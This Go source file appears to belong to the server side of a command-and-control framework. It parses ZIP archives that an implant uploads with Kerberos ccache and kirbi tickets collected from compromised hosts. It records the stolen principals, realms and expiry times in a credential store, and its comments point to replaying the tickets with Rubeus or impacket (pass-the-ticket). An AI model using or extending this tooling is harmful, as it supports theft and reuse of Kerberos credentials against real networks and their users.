package cred

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"
	"time"
)

// ===== Kerberos 票据缓存制品（MIT ccache 文件集）=====
//
// 客户端把本机能读到的 ccache 文件打包成 ZIP（见 implant/core/services/ticket.go）：
//
//	manifest.json         {host,user,collected_at,errors,files:[{name,size}]}
//	tickets/<文件名>       原始 ccache（v3/v4）
//
// 服务端**逐条目解析**（ParseCCache）：principal / 票据数 / 最晚到期时间登记进凭据库，
// 制品本体照样留档，便于后续导入（kinit -c / Rubeus ptt / impacket）。
//
// 与 DPAPI 的 ZIP 一样防 ZIP 炸弹：读条目时按 MaxTicketBytes 收口，
// 不信任中心目录里的 UncompressedSize64。

const (
	// MaxTicketCaches 单次制品最多登记的缓存数（与客户端 maxCCacheFiles 一致）
	MaxTicketCaches = 64
	// MaxTicketBytes 单个 ccache 上限：正常票据文件几十 KB，4MB 已是三个数量级的余量
	MaxTicketBytes = 4 << 20
	// MaxTicketArtifactBytes 制品本体上限（ZIP 压缩后）
	MaxTicketArtifactBytes = 16 << 20
)

// TicketCache 一个已解析的票据缓存
type TicketCache struct {
	File      string `json:"file"`             // ZIP 内条目名
	Source    string `json:"source,omitempty"` // ccache（默认）| lsa
	Server    string `json:"server,omitempty"` // LSA：服务名（krbtgt/DOMAIN、cifs/host）
	Version   int    `json:"version"`          // ccache 版本（3 / 4）；LSA 为 0
	Principal string `json:"principal"`        // user@REALM（ccache.DefaultPrincipal）
	Realm     string `json:"realm,omitempty"`
	Tickets   int    `json:"tickets"`           // 凭据条目数（含服务票据）；LSA 每张 1
	Expires   string `json:"expires,omitempty"` // 最晚 end_time（UTC，RFC3339）
}

// lsaTicketEntry 清单里的一条 LSA 票据元数据（客户端 core/services/ticket.go 写入）
type lsaTicketEntry struct {
	File    string `json:"file"`
	Client  string `json:"client,omitempty"`
	Realm   string `json:"realm,omitempty"`
	Server  string `json:"server"`
	Start   string `json:"start,omitempty"`
	End     string `json:"end,omitempty"`
	Renew   string `json:"renew,omitempty"`
	Flags   uint32 `json:"flags,omitempty"`
	EncType int32  `json:"enc_type,omitempty"`
	Size    int    `json:"size,omitempty"`
}

// TicketArtifact 票据制品（解析结果）
type TicketArtifact struct {
	Host        string        `json:"host"`
	User        string        `json:"user"`
	CollectedAt string        `json:"collected_at"`
	Errors      []string      `json:"errors,omitempty"`
	Caches      []TicketCache `json:"caches"`

	hasManifest bool // 解析时置位；只用于 Info() 标注，不参与序列化
}

// Info 汇总制品统计（写入任务结果与制品备注）
func (a TicketArtifact) Info() ArtifactInfo {
	info := ArtifactInfo{Format: FormatZip, Entries: len(a.Caches), HasManifest: a.hasManifest,
		TicketCaches: len(a.Caches), SkippedItems: len(a.Errors)}
	for _, c := range a.Caches {
		info.Tickets += c.Tickets
	}
	return info
}

// ParseTicketArtifact 解析并校验票据制品。
//
// 判定标准与其它制品一致：必须"完整且可用" ——
// 一个能解出 principal 的 ccache 都没有时显式失败，不登记半截制品。
func ParseTicketArtifact(path string) (TicketArtifact, error) {
	var art TicketArtifact

	st, err := os.Stat(path)
	if err != nil {
		return art, err
	}
	if st.Size() == 0 {
		return art, fmt.Errorf("制品为空文件")
	}
	if st.Size() > MaxTicketArtifactBytes {
		return art, fmt.Errorf("制品体积超限（%.1f MB > %d MB）",
			float64(st.Size())/1024/1024, MaxTicketArtifactBytes>>20)
	}

	zr, err := zip.OpenReader(path)
	if err != nil {
		return art, fmt.Errorf("制品不是合法 ZIP: %w", err)
	}
	defer zr.Close()
	if len(zr.File) == 0 {
		return art, fmt.Errorf("制品里没有任何文件")
	}

	// 直接解析成功的 kirbi 文件名：清单里同名的条目不再重复登记。
	// 两条来源并存时以**二进制解析结果**为准 —— 它才是事实来源，
	// 清单只是老客户端的兼容路径。
	parsedKirbi := make(map[string]bool)
	var manifestLSA []TicketCache

	for _, f := range zr.File {
		if f.FileInfo().IsDir() {
			continue
		}
		name := f.Name

		// 清单可选：缺失时按条目内容为准，不让一个可选的元信息文件卡住整份战果
		if strings.EqualFold(name, "manifest.json") {
			art.hasManifest = true // 解析失败不影响结论：条目内容才是事实来源
			if raw, rerr := readZipEntry(f, MaxTicketBytes); rerr == nil {
				var m struct {
					Host        string   `json:"host"`
					User        string   `json:"user"`
					CollectedAt string   `json:"collected_at"`
					Errors      []string `json:"errors"`
					// LSA 导出的是 kirbi（KRB_CRED）。**更正**：kirbi 的 enc-part
					// etype 为 0、cipher 就是明文 DER，服务端能自行解析（见 kirbi.go），
					// 不再需要密钥。清单仍保留 —— 老客户端只上传清单，
					// 且清单里可能有二进制解析拿不到的补充字段（如服务名简写）。
					LSATickets []lsaTicketEntry `json:"lsa_tickets"`
				}
				if json.Unmarshal(raw, &m) == nil {
					art.Host, art.User, art.CollectedAt = m.Host, m.User, m.CollectedAt
					art.Errors = append(art.Errors, m.Errors...)
					for _, t := range m.LSATickets {
						if strings.TrimSpace(t.File) == "" {
							continue
						}
						principal := t.Client
						if principal != "" && t.Realm != "" && !strings.Contains(principal, "@") {
							principal += "@" + t.Realm
						}
						// 清单条目先收着：等整份制品扫完，
						// 凡是二进制已解析成功的同名 kirbi 就不再重复登记。
						manifestLSA = append(manifestLSA, TicketCache{
							File: t.File, Source: "lsa", Server: t.Server,
							Principal: principal, Realm: t.Realm,
							Tickets: 1, Expires: t.End,
						})
						if len(manifestLSA) >= MaxTicketCaches {
							break
						}
					}
				}
			}
			continue
		}

		lower := strings.ToLower(name)
		if strings.HasPrefix(lower, "kirbi/") || strings.HasSuffix(lower, ".kirbi") {
			// LSA 导出的 kirbi：**直接解析二进制**。
			//
			// 更正：过去的注释说"enc-part 需要密钥才能解，服务端拿不到 principal"。
			// 对标准 kirbi 而言这不成立 —— enc-part 的 etype 为 0，cipher 里存的就是
			// 明文 DER（见 kirbi.go 文件头与 ccache-v4-kirbi 夹具）。
			// 所以服务端可以自己解析，不再只能依赖客户端清单：
			// 清单缺失或漏项时，票据照样能登记进凭据库。
			if len(art.Caches) >= MaxTicketCaches {
				art.Errors = append(art.Errors, fmt.Sprintf("缓存数超过上限 %d，其余条目未解析", MaxTicketCaches))
				break
			}
			raw, rerr := readZipEntry(f, MaxTicketBytes)
			if rerr != nil {
				art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", name, rerr))
				continue
			}
			kc, kerr := ParseKirbi(raw)
			if kerr != nil {
				// 单张票据坏掉不影响其它票据，但要显式告诉操作员少了一张
				art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", name, kerr))
				continue
			}
			art.Caches = append(art.Caches, ticketCacheFromCCache(name, "lsa", kc))
			parsedKirbi[name] = true
			continue
		}
		if !strings.HasPrefix(lower, "tickets/") && !strings.HasSuffix(lower, ".ccache") {
			continue // 无关条目（未来可能加的说明文件）直接忽略
		}
		if len(art.Caches) >= MaxTicketCaches {
			art.Errors = append(art.Errors, fmt.Sprintf("缓存数超过上限 %d，其余条目未解析", MaxTicketCaches))
			break
		}

		raw, rerr := readZipEntry(f, MaxTicketBytes)
		if rerr != nil {
			art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", name, rerr))
			continue
		}
		cc, perr := ParseCCache(raw)
		if perr != nil {
			// 单个缓存坏掉不影响其它缓存，但要显式告诉操作员
			art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", name, perr))
			continue
		}
		art.Caches = append(art.Caches, ticketCacheFromCCache(name, "", cc))
	}

	// 合并清单里的 LSA 元数据：二进制已解析成功的同名条目跳过
	for _, mc := range manifestLSA {
		if parsedKirbi[mc.File] {
			continue
		}
		if len(art.Caches) >= MaxTicketCaches {
			art.Errors = append(art.Errors, fmt.Sprintf("缓存数超过上限 %d，清单其余条目未登记", MaxTicketCaches))
			break
		}
		art.Caches = append(art.Caches, mc)
	}

	if len(art.Caches) == 0 {
		return art, fmt.Errorf("制品里没有可解析的 ccache 或 LSA 票据（errors: %s）", strings.Join(art.Errors, "；"))
	}
	return art, nil
}

// ticketCacheFromCCache 把解析结果转成登记用的条目。
// source 为空表示 ccache 文件；"lsa" 表示由 kirbi 解析而来（Version 记为 0，
// 因为 kirbi 没有 ccache 版本号，填 4 会误导使用者以为这是 ccache 文件）。
func ticketCacheFromCCache(file, source string, cc *CCache) TicketCache {
	tc := TicketCache{
		File:      file,
		Source:    source,
		Principal: cc.Principal.String(),
		Realm:     cc.Principal.Realm,
		Tickets:   len(cc.Credentials),
		Expires:   ticketExpiry(cc),
	}
	if source == "" {
		tc.Version = cc.Version
	}
	return tc
}

// ticketExpiry 取所有凭据里最晚的 end_time（UTC RFC3339）；全为零值时返回空串。
func ticketExpiry(cc *CCache) string {
	var latest time.Time
	for _, c := range cc.Credentials {
		if c.EndTime.After(latest) {
			latest = c.EndTime
		}
	}
	if latest.IsZero() {
		return ""
	}
	return latest.UTC().Format(time.RFC3339)
}

// readZipEntry 读取 ZIP 条目并做大小收口（不信任中心目录里的长度字段）。
func readZipEntry(f *zip.File, limit int64) ([]byte, error) {
	rc, err := f.Open()
	if err != nil {
		return nil, err
	}
	defer rc.Close()
	raw, err := io.ReadAll(io.LimitReader(rc, limit+1))
	if err != nil {
		return nil, err
	}
	if int64(len(raw)) > limit {
		return nil, fmt.Errorf("条目超过 %d KB 上限", limit>>10)
	}
	return raw, nil
}
